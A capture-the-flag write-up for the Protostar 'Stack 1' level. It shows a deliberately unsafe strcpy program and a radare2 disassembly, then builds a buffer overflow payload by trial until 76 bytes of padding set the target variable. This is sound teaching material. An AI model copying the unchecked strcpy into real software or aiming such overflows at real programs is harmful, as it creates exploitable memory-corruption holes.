# Stack 1

## About

This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.

Hints
* If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.
* Protostar is little endian

## Source code

``` c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}

```

## Solution

like last time lets open this up in radare2 and `seek` to `main`

``` bash
[root:~]# r2 -A ./1
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[ ] [*] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan))
[0x00000650]> s main
```

ok lets print the dissasembly

``` bash
[0x00000780]> pd

..Snip..

0x000007c7      e834feffff     call sym.imp.strcpy        ; char *strcpy(char *dest, const char *src);
|           0x000007cc      8b45fc         mov eax, dword [rbp - local_4h]
|           0x000007cf      3d64636261     cmp eax, 0x61626364
|       ,=< 0x000007d4      750e           jne 0x7e4
|       |   0x000007d6      488d3ddb0000.  lea rdi, qword str.you_have_correctly_got_the_variable_to_the_right_value ; 0x8b8 ; str.you_have_correctly_got_the_variable_to_the_right_value ; "you have correctly got the variable to the right value" @ 0x8b8

..Snip..

```

looking at that it looks to do a `cmp` of the `eax` to `0x61626364`

putting this in a little endian format would look like this 


``` bash
[root:~]# ./1 $(python -c 'print "A"*64 + "\x64\x63\x62\x61"')
Try again, you got 0x00000000
[root:~]# ./1 $(python -c 'print "A"*80 + "\x64\x63\x62\x61"')
Try again, you got 0x41414141
[root:~]# ./1 $(python -c 'print "A"*78 + "\x64\x63\x62\x61"')
Try again, you got 0x63644141
[root:~]# ./1 $(python -c 'print "A"*70 + "\x64\x63\x62\x61"')
Try again, you got 0x00000000
[root:~]# ./1 $(python -c 'print "A"*75 + "\x64\x63\x62\x61"')
Try again, you got 0x00616263
[root:~]# ./1 $(python -c 'print "A"*76 + "\x64\x63\x62\x61"')
you have correctly got the variable to the right value
```

the buffer was `64` but to have it have this value set to `0x61626364` it required `76`
